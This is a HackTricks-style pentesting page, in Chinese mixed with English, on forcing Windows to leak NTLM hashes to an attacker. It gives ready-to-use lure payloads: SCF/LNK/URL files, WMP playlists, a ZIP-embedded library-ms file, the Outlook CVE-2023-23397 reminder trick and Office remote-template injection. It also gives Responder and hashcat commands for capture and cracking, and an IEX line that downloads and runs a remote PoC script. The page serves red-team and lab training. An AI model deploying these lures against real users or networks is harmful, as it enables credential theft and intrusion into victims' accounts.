# 窃取 NTLM 凭据的地点

{{#include ../../banners/hacktricks-training.md}}

**查看所有这些很棒的想法，来自 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)，从在线下载的 microsoft word 文件 到 ntlm leaks 源: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 和 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### 可写 SMB 共享 + Explorer 触发的 UNC 诱饵 (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

如果你可以**写入一个用户或计划任务会在 Explorer 中浏览的共享**，就丢置其元数据指向你的 UNC (例如 `\\ATTACKER\share`) 的文件。渲染该文件夹会触发 **隐式 SMB 身份验证** 并 leaks 一个 **NetNTLMv2** 到你的监听器。

1. **生成诱饵** (涵盖 SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **将它们放到 writable share 上**（受害者打开的任何文件夹）:
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows 可能会同时访问多个文件；Explorer 预览的任何内容（`BROWSE TO FOLDER`）都不需要点击。

### Windows Media Player 播放列表 (.ASX/.WAX)

如果你能让目标打开或预览你控制的 Windows Media Player 播放列表，你可以通过将条目指向 UNC path 来 leak Net‑NTLMv2。WMP 会尝试通过 SMB 获取引用的媒体并会自动进行认证。

示例 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
收集与破解流程：
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP 嵌入的 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows 资源管理器在直接从 ZIP 存档中打开 .library-ms 文件时处理不安全。如果库定义指向远程 UNC 路径（例如 \\attacker\share），仅在 ZIP 内浏览/启动 .library-ms 就会导致资源管理器枚举该 UNC 并向攻击者发送 NTLM 认证。这样会产生一个 NetNTLMv2，可以离线破解或有可能被中继。

指向攻击者 UNC 的最小 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
操作步骤
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Outlook 日历提醒声音路径 (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows processed the extended MAPI property PidLidReminderFileParameter in calendar items. If that property points to a UNC path (e.g., \\attacker\share\alert.wav), Outlook would contact the SMB share when the reminder fires, leaking the user’s Net‑NTLMv2 without any click. This was patched on March 14, 2023, but it’s still highly relevant for legacy/untouched fleets and for historical incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
监听端：
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
注意事项
- 受害者只需在提醒触发时运行 Outlook for Windows。
- 该 leak 会产生 Net‑NTLMv2，适用于 offline cracking 或 relay（不是 pass‑the‑hash）。


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer 会自动呈现快捷方式图标。最近的研究表明，即使在 Microsoft 于 2025 年 4 月为 UNC‑icon shortcuts 发布补丁之后，仍然可以通过将快捷方式目标托管在 UNC 路径上并将图标保存在本地来无需点击触发 NTLM 身份验证（补丁绕过被分配为 CVE‑2025‑50154）。仅仅查看该文件夹就会导致 Explorer 从远程目标检索元数据，并向攻击者的 SMB 服务器发送 NTLM。

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
程序快捷方式 payload (.lnk) 通过 PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- 将 shortcut 放入 ZIP 中，并诱使受害者浏览它。
- 将 shortcut 放在受害者会打开的可写 share 上。
- 与同文件夹中的其他诱饵文件结合，使 Explorer 预览这些项。


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 文档可以引用外部模板。如果将附加的模板设置为 UNC path，打开文档时会向 SMB 进行身份验证。

Minimal DOCX relationship changes (inside word/):

1) 编辑 word/settings.xml 并添加附加的模板引用：
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) 编辑 word/_rels/settings.xml.rels 并将 rId1337 指向你的 UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) 重新打包为 .docx 并交付。运行你的 SMB 捕获侦听器并等待打开。

有关捕获后转发或滥用 NTLM 的思路，请参阅：

{{#ref}}
README.md
{{#endref}}


## 参考资料
- [HTB: Breach – 可写共享诱饵 + Responder 捕获 → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – 零点击，一次 NTLM：Microsoft 安全补丁绕过 (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
